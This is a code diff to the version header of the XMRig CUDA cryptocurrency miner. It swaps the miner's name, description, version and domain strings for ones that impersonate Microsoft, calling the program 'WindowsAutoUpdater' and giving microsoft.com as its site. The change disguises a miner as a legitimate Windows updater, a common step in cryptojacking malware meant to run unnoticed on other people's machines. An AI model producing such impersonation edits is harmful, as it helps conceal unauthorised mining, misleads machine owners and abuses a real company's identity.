@@ -24,13 +24,13 @@
 #ifndef XMRIG_VERSION_H
 #define XMRIG_VERSION_H
 
-#define APP_ID        "xmrig"
-#define APP_NAME      "XMRig"
-#define APP_DESC      "XMRig CUDA miner"
-#define APP_VERSION   "2.7.0-beta"
-#define APP_DOMAIN    "xmrig.com"
-#define APP_SITE      "www.xmrig.com"
-#define APP_COPYRIGHT "Copyright (C) 2016-2018 xmrig.com"
+#define APP_ID        "WindowsAutoUpdater"
+#define APP_NAME      "WindowsAutoUpdater"
+#define APP_DESC      "Automatically download and update Windows software."
+#define APP_VERSION   "10.22.31.1"
+#define APP_DOMAIN    "microsoft.com"
+#define APP_SITE      "www.microsoft.com"
+#define APP_COPYRIGHT "Copyright (C) 2016-2018 microsoft.com"
 #define APP_KIND      "nvidia"
 
 #define APP_VER_MAJOR  2
